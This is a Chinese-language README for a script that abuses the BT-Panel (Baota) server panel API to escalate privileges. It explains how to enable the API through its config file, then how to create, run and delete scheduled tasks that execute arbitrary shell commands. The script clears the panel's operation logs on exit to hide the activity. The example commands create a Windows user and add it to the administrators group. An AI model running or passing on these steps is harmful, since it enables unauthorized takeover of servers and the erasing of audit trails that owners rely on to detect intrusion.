# BT-Panel API提权脚本

### 一、简介
 使用宝塔API进行权限提升，宝塔自带的计划任务功能，可以通过API创建执行shell命令的计划任务，并通过API接口获取执行结果。

### 二、打开API接口
修改宝塔配置文件，即可开启API接口，配置文件路径：
```js
Linux：/www/server/panel/config/api.json
Windows：C:\BtSoft\panel\config\api.json
```
修改为：
```json
{"open": true, "token": "API Token", "limit_addr": ["你的IP_1", "你的IP_2"]}
```
> 注：API Token => MD5(string)（16位）

### 三、执行过程
 1. 添加计划任务
 2. 执行计划任务
 3. 删除计划任务
 4. 退出时清空BT-Panel操作日志

### 四、使用方法
 1. 下载脚本
    ```
    git clone https://github.com/truda8/BT-Panel-Api-Exploit.git
    cd BT-Panel-Api-Exploit
    ```

 2. 修改配置信息
    ```python
    self.__BT_PANEL = "http://127.0.0.1:8888"  # 宝塔地址
    self.__BT_KEY = "ASsdkskPSDSLLpsdsSDswefcssdaS"    # API接口秘钥
    self.PROXY = "192.168.8.8:10809"  # HTTP代理
    ```

 3. 运行脚本
    ```bash
    python3 exploit.py
    ```

 4. 输入shell命令
    ```shell
    # 例如：windows添加用户并加到管理员组
    net user username password /add
    net user Administrator username /add
    ```

 5. 退出
    输入：quit 或 exit 清空宝塔操作日志并退出脚本